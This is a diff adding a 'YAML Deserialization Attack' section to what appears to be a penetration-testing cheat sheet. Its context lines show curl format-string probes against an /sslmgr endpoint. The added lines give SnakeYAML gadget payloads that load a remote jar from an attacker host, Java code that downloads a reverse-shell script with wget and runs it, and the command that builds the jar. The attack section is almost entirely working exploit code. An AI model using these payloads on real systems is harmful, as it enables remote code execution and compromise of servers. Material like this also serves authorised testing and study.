@@ -822,3 +822,47 @@ time curl -s -d 'scep-profile-name=%9999999c' https://localhost/sslmgr >/dev/nul
 time curl -s -d 'scep-profile-name=%99999999c' https://localhost/sslmgr >/dev/null
 time curl -s -d 'scep-profile-name=%999999999c' https://localhost/sslmgr >/dev/null
 ```
+
+### YAML Deserialization Attack
+
+Testing a poc
+```
+!!javax.script.ScriptEngineManager [
+ !!java.net.URLClassLoader [[
+ !!java.net.URL ["http://<attackerip>"]
+ ]]
+]
+```
+
+Generating a payload
+
+payload.jar
+
+```
+ public AwesomeScriptEngineFactory() throws Exception {
+ try {
+ Process p = Runtime.getRuntime().exec("wget <LHOST>/revshell.sh -O /tmp/revshell");
+ p.waitFor();
+ p = Runtime.getRuntime().exec("chmod +x /tmp/revshell");
+ p.waitFor();
+ p = Runtime.getRuntime().exec("/tmp/revshell");
+ p.waitFor();
+ } catch (IOException e) {
+ e.printStackTrace();
+ }
+ }
+ ```
+ 
+ Compiling your payload using java
+ 
+`jar -cvf payload.jar -C src/ .`
+
+Executing your yaml payload
+
+```
+!!javax.script.ScriptEngineManager [
+  !!java.net.URLClassLoader [[
+    !!java.net.URL ["http://<attackerip>/payload.jar"]
+  ]]
+]
+```
